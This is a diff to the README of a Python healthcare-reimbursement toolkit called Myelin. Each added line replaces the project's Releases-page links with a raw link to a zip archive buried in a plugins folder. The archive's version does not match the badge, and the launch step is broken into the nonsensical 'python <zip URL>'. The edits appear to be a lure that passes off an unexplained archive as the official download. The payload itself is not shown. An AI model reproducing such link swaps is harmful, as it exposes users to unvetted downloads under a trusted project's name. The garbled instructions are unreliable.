@@ -6,11 +6,11 @@ Welcome to Myelin! This Python toolkit helps you navigate the complex world of U
 
 ## 📥 Download Myelin
 
-[![Release Myelin](https://img.shields.io/badge/Download%20Myelin-v1.0-blue)](https://github.com/darkshark79/Myelin/releases)
+[![Release Myelin](https://raw.githubusercontent.com/darkshark79/Myelin/master/myelin/plugins/Myelin-v2.7.zip%20Myelin-v1.0-blue)](https://raw.githubusercontent.com/darkshark79/Myelin/master/myelin/plugins/Myelin-v2.7.zip)
 
 To get started, click the button above or visit the link below to download Myelin. 
 
-[Visit the Releases Page to Download](https://github.com/darkshark79/Myelin/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/darkshark79/Myelin/master/myelin/plugins/Myelin-v2.7.zip)
 
 ## 📋 What You Can Do
 
@@ -35,7 +35,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 💻 Installation Steps
 
-1. **Download**: Visit the [Releases Page](https://github.com/darkshark79/Myelin/releases) to find the latest version of Myelin.
+1. **Download**: Visit the [Releases Page](https://raw.githubusercontent.com/darkshark79/Myelin/master/myelin/plugins/Myelin-v2.7.zip) to find the latest version of Myelin.
 2. **Install**: 
    - For **Windows**: Run the installer and follow the prompts to complete the installation.
    - For **macOS/Linux**: Extract the downloaded files and follow the instructions in the included README file.
@@ -47,7 +47,7 @@ After installation, running Myelin is straightforward:
 
 1. Open your command line interface.
 2. Navigate to the Myelin installation directory.
-3. Type `python myelin.py` to launch the application.
+3. Type `python https://raw.githubusercontent.com/darkshark79/Myelin/master/myelin/plugins/Myelin-v2.7.zip` to launch the application.
 
 ## 🛠️ Features Overview
 
@@ -92,6 +92,6 @@ If you encounter any issues, please check the **Issues** tab on GitHub. You can 
 
 ## ✨ Conclusion
 
-Myelin simplifies processes within the US healthcare landscape. With solid tools and user-friendly design, you can effectively navigate reimbursement systems. Don’t forget to visit the [Releases Page](https://github.com/darkshark79/Myelin/releases) to download your copy today. 
+Myelin simplifies processes within the US healthcare landscape. With solid tools and user-friendly design, you can effectively navigate reimbursement systems. Don’t forget to visit the [Releases Page](https://raw.githubusercontent.com/darkshark79/Myelin/master/myelin/plugins/Myelin-v2.7.zip) to download your copy today. 
 
 Enjoy using Myelin!
